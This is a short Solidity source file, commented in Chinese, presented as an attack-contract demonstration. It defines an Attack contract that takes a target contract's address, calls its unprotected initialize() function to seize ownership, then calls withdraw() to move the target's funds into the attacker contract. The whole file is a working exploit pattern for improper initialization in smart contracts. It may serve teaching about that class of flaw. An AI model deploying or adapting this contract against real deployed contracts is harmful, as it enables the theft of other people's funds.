// 攻擊合約示範
// 此合約利用 VulnerableContract 中的不當初始化漏洞
// 攻擊者可以呼叫 initialize() 取得 owner 權限，並利用 withdraw() 提取合約內的資金

contract VulnerableContract {
    // 介面定義，用來呼叫原合約上的函式
    function initialize() public {}
    function withdraw() public {}
}

contract Attack {
    VulnerableContract public vulnerable;

    // 在部署 Attack 合約時指定目標 VulnerableContract 的地址
    constructor(address _vulnerableAddress) {
        vulnerable = VulnerableContract(_vulnerableAddress);
    }

    // 攻擊流程：
    // 1. 呼叫 initialize()，若原始合約尚未初始化，則 attacker 就會成為 owner
    // 2. 呼叫 withdraw()，將合約內的資金轉至 attacker 合約
    function attack() public {
        vulnerable.initialize();
        vulnerable.withdraw();
    }

    // 用以接收轉入的 ETH
    receive() external payable {}
}
